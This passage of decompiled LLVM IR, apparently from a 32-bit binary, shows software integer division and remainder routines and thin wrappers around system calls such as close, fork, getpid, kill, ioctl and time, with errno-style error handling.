  %v0_c910 = phi i32 [ %v0_c904, %dec_label_pc_c8f8 ], [ %v3_c904, %bb86 ]
  %v1_c90c = phi i32 [ %v1_c900, %dec_label_pc_c8f8 ], [ %v0_c90852, %bb86 ]
  %v3_c908 = icmp ult i32 %v1_c90c, %v0_c910
  br i1 %v3_c908, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_c908
  %v2_c908 = sub i32 %v1_c90c, %v0_c910
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_c908, %bb87
  %v0_c91455 = phi i32 [ %v1_c90c, %dec_label_pc_c908 ], [ %v2_c908, %bb87 ]
  %v3_c910 = udiv i32 %v0_c910, 2
  br label %dec_label_pc_c914

dec_label_pc_c914:                                ; preds = %dec_label_pc_c8f0, %bb88
  %v2_c918 = phi i32 [ %v0_c904, %dec_label_pc_c8f0 ], [ %v3_c910, %bb88 ]
  %v1_c918 = phi i32 [ %v1_c900, %dec_label_pc_c8f0 ], [ %v0_c91455, %bb88 ]
  %v3_c914 = icmp ult i32 %v1_c918, %v2_c918
  br i1 %v3_c914, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_c914
  %v2_c914 = sub i32 %v1_c918, %v2_c918
  br label %bb76

dec_label_pc_c920:                                ; preds = %dec_label_pc_c864
  %v0_c920 = load i32, i32* @lr, align 4
  %v0_c924 = call i32 @function_ca14()
  call void @__pseudo_branch(i32 %v0_c920)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_c918, { 1, 2, 0 }
  uselistorder i32 %v0_c904, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_c8e4, { 1, 0, 2 }
  uselistorder i32 %v7_c8dc, { 1, 0 }
  uselistorder i32 %v3_c8d8, { 1, 0 }
  uselistorder i32 %v1_c8c0.v6_c8c0.v6_c8c8.v6_c8d0, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_c8cc, { 1, 0 }
  uselistorder i32 %v4_c8c4, { 1, 0 }
  uselistorder i32 %v4_c8bc, { 1, 0 }
  uselistorder i32 %v6_c8dc, { 3, 0, 2, 1 }
  uselistorder i32 %v2_c8ac, { 1, 0 }
  uselistorder i32 %v1_c8a0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_c88c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_c898.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c86c, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_c914, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_c908, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_c8b4, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @function_c930(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c930:
  store i32 %arg1, i32* @r0, align 4
  %v2_c930 = icmp eq i32 %arg2, 0
  br i1 %v2_c930, label %dec_label_pc_ca04, label %dec_label_pc_c938

dec_label_pc_c938:                                ; preds = %dec_label_pc_c930
  %v1_c930 = icmp slt i32 %arg2, 0
  br i1 %v1_c930, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_c938
  %v2_c938 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_c938, %bb
  %v4_c950 = phi i32 [ %arg2, %dec_label_pc_c938 ], [ %v2_c938, %bb ]
  %v0_c93c = load i32, i32* @r0, align 4
  %v1_c93c = icmp slt i32 %v0_c93c, 0
  br i1 %v1_c93c, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_c940 = sub i32 0, %v0_c93c
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_c948 = phi i32 [ %v0_c93c, %bb79 ], [ %v2_c940, %bb80 ]
  %v1_c944 = add i32 %v4_c950, -1
  %v7_c944 = icmp eq i32 %v4_c950, 1
  br i1 %v7_c944, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_c948 = icmp eq i32 %v1_c948, %v4_c950
  br i1 %v10_c948, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_c948 = icmp ult i32 %v1_c948, %v4_c950
  br i1 %v4_c948, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_c950 = and i32 %v1_c944, %v4_c950
  %v8_c950 = icmp eq i32 %v6_c950, 0
  br i1 %v8_c950, label %.thread72, label %dec_label_pc_c960.preheader

dec_label_pc_c960.preheader:                      ; preds = %bb84
  %v2_c960109 = icmp ugt i32 %v4_c950, 268435455
  br i1 %v2_c960109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_c95464 = phi i32 [ %v1_c948, %bb84 ], [ 0, %.thread70 ]
  %v3_c954 = and i32 %v1_c95464, %v1_c944
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_c960.preheader
  %v0_c974.pr35.lcssa = phi i32 [ %v4_c950, %dec_label_pc_c960.preheader ], [ %v4_c968, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_c960.preheader ], [ %v2_c96c9, %.thread2.thread7 ]
  br label %dec_label_pc_c974thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_c960.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_c96c9, %.thread2.thread7 ], [ 0, %dec_label_pc_c960.preheader ]
  %v0_c974.pr35110 = phi i32 [ %v4_c968, %.thread2.thread7 ], [ %v4_c950, %dec_label_pc_c960.preheader ]
  %v4_c964 = icmp ult i32 %v0_c974.pr35110, %v1_c948
  br i1 %v4_c964, label %bb86, label %dec_label_pc_c974thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_c968 = and i32 %v0_c974.pr35110, 268435456
  %v3_c968 = icmp eq i32 %v2_c968, 0
  %v4_c968 = mul i32 %v0_c974.pr35110, 16
  br i1 %v3_c968, label %.thread2.thread7, label %dec_label_pc_c974.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_c96c9 = add i32 %storemerge111, 4
  %v2_c960 = icmp ugt i32 %v4_c968, 268435455
  br i1 %v2_c960, label %.thread1, label %bb85

dec_label_pc_c974thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_c974thread-pre-split.loopexit

dec_label_pc_c974thread-pre-split.loopexit:       ; preds = %dec_label_pc_c974thread-pre-split.loopexit.loopexit, %.thread1
  %v0_c974.pr35108 = phi i32 [ %v0_c974.pr35.lcssa, %.thread1 ], [ %v0_c974.pr35110, %dec_label_pc_c974thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_c974thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_c974thread-pre-split

dec_label_pc_c974thread-pre-split:                ; preds = %.thread4, %dec_label_pc_c974thread-pre-split.loopexit
  %v1_c98041 = phi i32 [ %storemerge105, %dec_label_pc_c974thread-pre-split.loopexit ], [ %v2_c980, %.thread4 ]
  %v2_c97836 = phi i32 [ %v1_c948, %dec_label_pc_c974thread-pre-split.loopexit ], [ %v2_c978, %.thread4 ]
  %v0_c974.pr = phi i32 [ %v0_c974.pr35108, %dec_label_pc_c974thread-pre-split.loopexit ], [ %v3_c97c, %.thread4 ]
  br label %dec_label_pc_c974

dec_label_pc_c974.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_c974

dec_label_pc_c974:                                ; preds = %dec_label_pc_c974.loopexit, %dec_label_pc_c974thread-pre-split
  %v0_c988.pr = phi i32 [ %v1_c98041, %dec_label_pc_c974thread-pre-split ], [ %storemerge111, %dec_label_pc_c974.loopexit ]
  %v2_c978 = phi i32 [ %v2_c97836, %dec_label_pc_c974thread-pre-split ], [ %v1_c948, %dec_label_pc_c974.loopexit ]
  %v1_c97c = phi i32 [ %v0_c974.pr, %dec_label_pc_c974thread-pre-split ], [ %v4_c968, %dec_label_pc_c974.loopexit ]
  %v2_c974 = icmp slt i32 %v1_c97c, 0
  br i1 %v2_c974, label %dec_label_pc_c988, label %bb87

bb87:                                             ; preds = %dec_label_pc_c974
  %v4_c978 = icmp ult i32 %v1_c97c, %v2_c978
  br i1 %v4_c978, label %.thread4, label %dec_label_pc_c988

.thread4:                                         ; preds = %bb87
  %v3_c97c = mul i32 %v1_c97c, 2
  %v2_c980 = add i32 %v0_c988.pr, 1
  br label %dec_label_pc_c974thread-pre-split

dec_label_pc_c988:                                ; preds = %bb87, %dec_label_pc_c974
  %v2_c988 = add i32 %v0_c988.pr, -3
  %v5_c98c = icmp slt i32 %v0_c988.pr, 3
  br i1 %v5_c98c, label %dec_label_pc_c9cc, label %dec_label_pc_c990

dec_label_pc_c990:                                ; preds = %dec_label_pc_c988, %bb91
  %v6_c9b8 = phi i32 [ %v0_c9c0, %bb91 ], [ %v2_c988, %dec_label_pc_c988 ]
  %v1_c994 = phi i32 [ %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, %bb91 ], [ %v2_c978, %dec_label_pc_c988 ]
  %v3_c9b410 = phi i32 [ %v3_c9b4, %bb91 ], [ %v1_c97c, %dec_label_pc_c988 ]
  %v3_c990 = icmp ult i32 %v1_c994, %v3_c9b410
  %v3_c994 = select i1 %v3_c990, i32 0, i32 %v3_c9b410
  %v1_c99c = sub i32 %v1_c994, %v3_c994
  %v4_c998 = udiv i32 %v3_c9b410, 2
  %v6_c998 = icmp ult i32 %v1_c99c, %v4_c998
  %v6_c99c = select i1 %v6_c998, i32 0, i32 %v4_c998
  %v1_c99c.v6_c99c = sub i32 %v1_c99c, %v6_c99c
  %.demorgan = and i1 %v3_c990, %v6_c998
  %v4_c9a0 = udiv i32 %v3_c9b410, 4
  %v6_c9a0 = icmp ult i32 %v1_c99c.v6_c99c, %v4_c9a0
  %v6_c9a4 = select i1 %v6_c9a0, i32 0, i32 %v4_c9a0
  %v1_c99c.v6_c99c.v6_c9a4 = sub i32 %v1_c99c.v6_c99c, %v6_c9a4
  %.demorgan76 = and i1 %.demorgan, %v6_c9a0
  %v4_c9a8 = udiv i32 %v3_c9b410, 8
  %v6_c9a8 = icmp ult i32 %v1_c99c.v6_c99c.v6_c9a4, %v4_c9a8
  %v6_c9ac = select i1 %v6_c9a8, i32 0, i32 %v4_c9a8
  %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac = sub i32 %v1_c99c.v6_c99c.v6_c9a4, %v6_c9ac
  %.demorgan77 = and i1 %.demorgan76, %v6_c9a8
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_c990
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_c990, %bb88
  %v2_c9b0 = add i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, -1
  %v4_c9b0 = sub i32 0, %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac
  %v5_c9b0 = and i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, %v4_c9b0
  %v3_c9b4 = udiv i32 %v3_c9b410, 16
  %v5_c9b8 = icmp slt i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, 1
  br i1 %v5_c9b8, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_c9b8 = add i32 %v6_c9b8, -4
  %v9_c9b8 = sub i32 3, %v6_c9b8
  %v10_c9b8 = and i32 %v9_c9b8, %v6_c9b8
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_c9c0 = phi i32 [ %v6_c9b8, %bb89 ], [ %v7_c9b8, %bb90 ]
  %v0_c9bc13.in = phi i32 [ %v2_c9b0, %bb89 ], [ %v7_c9b8, %bb90 ]
  %v1_c9bc12.in = phi i32 [ %v5_c9b0, %bb89 ], [ %v10_c9b8, %bb90 ]
  %v1_c9bc12 = icmp slt i32 %v1_c9bc12.in, 0
  %v0_c9bc13 = icmp slt i32 %v0_c9bc13.in, 0
  %v2_c9bc = xor i1 %v0_c9bc13, %v1_c9bc12
  br i1 %v2_c9bc, label %dec_label_pc_c9c0, label %dec_label_pc_c990

dec_label_pc_c9c0:                                ; preds = %bb91
  %v1_c9c0 = urem i32 %v0_c9c0, 4
  %v2_c9c0 = icmp eq i32 %v1_c9c0, 0
  br i1 %v2_c9c0, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_c9c0
  %v3_c9c4 = icmp eq i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, 0
  br i1 %v3_c9c4, label %.thread6, label %dec_label_pc_c9cc

dec_label_pc_c9cc:                                ; preds = %bb92, %dec_label_pc_c988
  %v0_c9e0 = phi i32 [ %v3_c9b4, %bb92 ], [ %v1_c97c, %dec_label_pc_c988 ]
  %v1_c9dc = phi i32 [ %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, %bb92 ], [ %v2_c978, %dec_label_pc_c988 ]
  %v0_c9cc = phi i32 [ %v0_c9c0, %bb92 ], [ %v2_c988, %dec_label_pc_c988 ]
  %v5_c9d0 = icmp slt i32 %v0_c9cc, -2
  br i1 %v5_c9d0, label %dec_label_pc_c9f0, label %dec_label_pc_c9d4

dec_label_pc_c9d4:                                ; preds = %dec_label_pc_c9cc
  %v8_c9cc = icmp eq i32 %v0_c9cc, -2
  br i1 %v8_c9cc, label %dec_label_pc_c9e4, label %dec_label_pc_c9d8

dec_label_pc_c9d8:                                ; preds = %dec_label_pc_c9d4
  %v3_c9d8 = icmp ult i32 %v1_c9dc, %v0_c9e0
  br i1 %v3_c9d8, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_c9d8
  %v2_c9d8 = sub i32 %v1_c9dc, %v0_c9e0
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_c9d8, %bb93
  %v0_c9e454 = phi i32 [ %v1_c9dc, %dec_label_pc_c9d8 ], [ %v2_c9d8, %bb93 ]
  %v3_c9e0 = udiv i32 %v0_c9e0, 2
  br label %dec_label_pc_c9e4

dec_label_pc_c9e4:                                ; preds = %dec_label_pc_c9d4, %bb94
  %v0_c9ec = phi i32 [ %v0_c9e0, %dec_label_pc_c9d4 ], [ %v3_c9e0, %bb94 ]
  %v1_c9e8 = phi i32 [ %v1_c9dc, %dec_label_pc_c9d4 ], [ %v0_c9e454, %bb94 ]
  %v3_c9e4 = icmp ult i32 %v1_c9e8, %v0_c9ec
  br i1 %v3_c9e4, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_c9e4
  %v2_c9e4 = sub i32 %v1_c9e8, %v0_c9ec
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_c9e4, %bb95
  %v0_c9f057 = phi i32 [ %v1_c9e8, %dec_label_pc_c9e4 ], [ %v2_c9e4, %bb95 ]
  %v3_c9ec = udiv i32 %v0_c9ec, 2
  br label %dec_label_pc_c9f0

dec_label_pc_c9f0:                                ; preds = %dec_label_pc_c9cc, %bb96
  %v2_c9f4 = phi i32 [ %v0_c9e0, %dec_label_pc_c9cc ], [ %v3_c9ec, %bb96 ]
  %v1_c9f4 = phi i32 [ %v1_c9dc, %dec_label_pc_c9cc ], [ %v0_c9f057, %bb96 ]
  %v3_c9f0 = icmp ult i32 %v1_c9f4, %v2_c9f4
  br i1 %v3_c9f0, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_c9f0
  %v2_c9f0 = sub i32 %v1_c9f4, %v2_c9f4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_c9f0, %bb83, %.thread72, %dec_label_pc_c9c0, %bb92, %bb97
  %v1_c9fc = phi i32 [ %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, %dec_label_pc_c9c0 ], [ 0, %bb92 ], [ %v1_c9f4, %dec_label_pc_c9f0 ], [ %v2_c9f0, %bb97 ], [ %v3_c954, %.thread72 ], [ %v1_c948, %bb83 ]
  br i1 %v1_c93c, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_c9fc = sub i32 0, %v1_c9fc
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_ca00 = phi i32 [ %v1_c9fc, %.thread6 ], [ %v2_c9fc, %bb98 ]
  ret i32 %v1_ca00

dec_label_pc_ca04:                                ; preds = %dec_label_pc_c930
  %v0_ca04 = load i32, i32* @lr, align 4
  %v0_ca08 = call i32 @function_ca14()
  call void @__pseudo_branch(i32 %v0_ca04)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_c9e0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_c9c0, { 1, 0, 2 }
  uselistorder i32 %v7_c9b8, { 1, 0 }
  uselistorder i32 %v3_c9b4, { 1, 0 }
  uselistorder i32 %v1_c99c.v6_c99c.v6_c9a4.v6_c9ac, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_c9a8, { 1, 0 }
  uselistorder i32 %v4_c9a0, { 1, 0 }
  uselistorder i32 %v4_c998, { 1, 0 }
  uselistorder i32 %v6_c9b8, { 3, 0, 2, 1 }
  uselistorder i32 %v2_c988, { 1, 0 }
  uselistorder i32 %v1_c97c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_c978, { 1, 0, 3, 2 }
  uselistorder i32 %v4_c968, { 1, 0, 3, 2 }
  uselistorder i32 %v0_c974.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c948, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_c950, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_c9f0, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_c9e4, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_c990, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @function_ca14() local_unnamed_addr {
dec_label_pc_ca14:
  %v1_ca14 = load i32, i32* @r0, align 4
  ret i32 %v1_ca14
}

define i32 @function_ca18(i32 %arg1) local_unnamed_addr {
dec_label_pc_ca18:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ca18 = load i32, i32* @r4, align 4
  store i32 %v3_ca18, i32* %stack_var_-8, align 4
  %v1_ca1c = call i32 @close(i32 %arg1)
  store i32 %v1_ca1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_ca1c, -4095
  br i1 %tmp, label %dec_label_pc_ca3c, label %dec_label_pc_ca2c

dec_label_pc_ca2c:                                ; preds = %dec_label_pc_ca18
  %v0_ca2c = call i32 @function_cc08()
  %v0_ca30 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca30 = sub i32 0, %v0_ca30
  %v2_ca34 = inttoptr i32 %v0_ca2c to i32*
  store i32 %v1_ca30, i32* %v2_ca34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca3c

dec_label_pc_ca3c:                                ; preds = %dec_label_pc_ca18, %dec_label_pc_ca2c
  %v0_ca3c = phi i32 [ %v1_ca1c, %dec_label_pc_ca18 ], [ -1, %dec_label_pc_ca2c ]
  %v2_ca40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ca40, i32* @r4, align 4
  ret i32 %v0_ca3c

; uselistorder directives
  uselistorder i32 %v1_ca1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ca3c, { 1, 0 }
}

define i32 @function_ca44(i32 %arg1) local_unnamed_addr {
dec_label_pc_ca44:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ca44 = load i32, i32* @r4, align 4
  store i32 %v3_ca44, i32* %stack_var_-8, align 4
  %v0_ca48 = call i32 @fork()
  store i32 %v0_ca48, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ca48, -4095
  br i1 %tmp, label %dec_label_pc_ca68, label %dec_label_pc_ca58

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca44
  %v0_ca58 = call i32 @function_cc08()
  %v0_ca5c = load i32, i32* %r4.global-to-local, align 4
  %v1_ca5c = sub i32 0, %v0_ca5c
  %v2_ca60 = inttoptr i32 %v0_ca58 to i32*
  store i32 %v1_ca5c, i32* %v2_ca60, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca68

dec_label_pc_ca68:                                ; preds = %dec_label_pc_ca44, %dec_label_pc_ca58
  %v0_ca68 = phi i32 [ %v0_ca48, %dec_label_pc_ca44 ], [ -1, %dec_label_pc_ca58 ]
  %v2_ca6c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ca6c, i32* @r4, align 4
  ret i32 %v0_ca68

; uselistorder directives
  uselistorder i32 %v0_ca48, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ca68, { 1, 0 }
}

define i32 @function_ca70() local_unnamed_addr {
dec_label_pc_ca70:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ca70 = load i32, i32* @r4, align 4
  store i32 %v3_ca70, i32* %stack_var_-8, align 4
  %v0_ca74 = call i32 @getpid()
  store i32 %v0_ca74, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_ca74, -4095
  br i1 %tmp, label %dec_label_pc_ca94, label %dec_label_pc_ca84

dec_label_pc_ca84:                                ; preds = %dec_label_pc_ca70
  %v0_ca84 = call i32 @function_cc08()
  %v0_ca88 = load i32, i32* %r4.global-to-local, align 4
  %v1_ca88 = sub i32 0, %v0_ca88
  %v2_ca8c = inttoptr i32 %v0_ca84 to i32*
  store i32 %v1_ca88, i32* %v2_ca8c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ca94

dec_label_pc_ca94:                                ; preds = %dec_label_pc_ca70, %dec_label_pc_ca84
  %v0_ca94 = phi i32 [ %v0_ca74, %dec_label_pc_ca70 ], [ -1, %dec_label_pc_ca84 ]
  %v2_ca98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ca98, i32* @r4, align 4
  ret i32 %v0_ca94

; uselistorder directives
  uselistorder i32 %v0_ca74, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ca94, { 1, 0 }
}

define i32 @function_ca9c() local_unnamed_addr {
dec_label_pc_ca9c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ca9c = load i32, i32* @r4, align 4
  store i32 %v3_ca9c, i32* %stack_var_-8, align 4
  %v0_caa0 = call i32 @getppid()
  store i32 %v0_caa0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_caa0, -4095
  br i1 %tmp, label %dec_label_pc_cac0, label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_ca9c
  %v0_cab0 = call i32 @function_cc08()
  %v0_cab4 = load i32, i32* %r4.global-to-local, align 4
  %v1_cab4 = sub i32 0, %v0_cab4
  %v2_cab8 = inttoptr i32 %v0_cab0 to i32*
  store i32 %v1_cab4, i32* %v2_cab8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cac0

dec_label_pc_cac0:                                ; preds = %dec_label_pc_ca9c, %dec_label_pc_cab0
  %v0_cac0 = phi i32 [ %v0_caa0, %dec_label_pc_ca9c ], [ -1, %dec_label_pc_cab0 ]
  %v2_cac4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cac4, i32* @r4, align 4
  ret i32 %v0_cac0

; uselistorder directives
  uselistorder i32 %v0_caa0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
}

define i32 @function_cac8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_cac8:
  %r4.global-to-local = alloca i32, align 4
  %v2_cae4 = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v2_cae4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cae4, -4095
  br i1 %tmp, label %dec_label_pc_cb04, label %dec_label_pc_caf4

dec_label_pc_caf4:                                ; preds = %dec_label_pc_cac8
  %v0_caf4 = call i32 @function_cc08()
  %v0_caf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_caf8 = sub i32 0, %v0_caf8
  %v2_cafc = inttoptr i32 %v0_caf4 to i32*
  store i32 %v1_caf8, i32* %v2_cafc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cb04

dec_label_pc_cb04:                                ; preds = %dec_label_pc_cac8, %dec_label_pc_caf4
  %v0_cb04 = phi i32 [ %v2_cae4, %dec_label_pc_cac8 ], [ -1, %dec_label_pc_caf4 ]
  ret i32 %v0_cb04

; uselistorder directives
  uselistorder i32 %v2_cae4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb04, { 1, 0 }
}

define i32 @function_cb18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cb18:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cb18 = load i32, i32* @r4, align 4
  store i32 %v3_cb18, i32* %stack_var_-8, align 4
  %v2_cb1c = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_cb1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cb1c, -4095
  br i1 %tmp, label %dec_label_pc_cb3c, label %dec_label_pc_cb2c

dec_label_pc_cb2c:                                ; preds = %dec_label_pc_cb18
  %v0_cb2c = call i32 @function_cc08()
  %v0_cb30 = load i32, i32* %r4.global-to-local, align 4
  %v1_cb30 = sub i32 0, %v0_cb30
  %v2_cb34 = inttoptr i32 %v0_cb2c to i32*
  store i32 %v1_cb30, i32* %v2_cb34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb18, %dec_label_pc_cb2c
  %v0_cb3c = phi i32 [ %v2_cb1c, %dec_label_pc_cb18 ], [ -1, %dec_label_pc_cb2c ]
  %v2_cb40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_cb40, i32* @r4, align 4
  ret i32 %v0_cb3c

; uselistorder directives
  uselistorder i32 %v2_cb1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb3c, { 1, 0 }
}

define i32 @function_cb44(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_cb44:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cb44 = load i32, i32* @r4, align 4
  store i32 %v3_cb44, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_cb6c, label %dec_label_pc_cb5c

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb44
  %v0_cb5c = call i32 @function_cc08()
  %v0_cb60 = load i32, i32* %r4.global-to-local, align 4
  %v1_cb60 = sub i32 0, %v0_cb60
  %v2_cb64 = inttoptr i32 %v0_cb5c to i32*
  store i32 %v1_cb60, i32* %v2_cb64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_cb70.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_cb6c

dec_label_pc_cb6c:                                ; preds = %dec_label_pc_cb44, %dec_label_pc_cb5c
  %v2_cb70 = phi i32 [ %v3_cb44, %dec_label_pc_cb44 ], [ %v2_cb70.pre, %dec_label_pc_cb5c ]
  %v0_cb6c = phi i32 [ %arg1, %dec_label_pc_cb44 ], [ -1, %dec_label_pc_cb5c ]
  store i32 %v2_cb70, i32* @r4, align 4
  ret i32 %v0_cb6c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_cb6c, { 1, 0 }
}

define i32 @function_cb74(i32* %arg1) local_unnamed_addr {
dec_label_pc_cb74:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_cb74 = load i32, i32* @r4, align 4
  store i32 %v3_cb74, i32* %stack_var_-8, align 4
  %v2_cb78 = call i32 @time(i32* %arg1)
  store i32 %v2_cb78, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_cb78, -4095
  br i1 %tmp, label %dec_label_pc_cb98, label %dec_label_pc_cb88

dec_label_pc_cb88:                                ; preds = %dec_label_pc_cb74
  %v0_cb88 = call i32 @function_cc08()
  %v0_cb8c = load i32, i32* %r4.global-to-local, align 4
  %v1_cb8c = sub i32 0, %v0_cb8c
  %v2_cb90 = inttoptr i32 %v0_cb88 to i32*
  store i32 %v1_cb8c, i32* %v2_cb90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_cb98

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb74, %dec_label_pc_cb88
  %v0_cb98 = phi i32 [ %v2_cb78, %dec_label_pc_cb74 ], [ -1, %dec_label_pc_cb88 ]
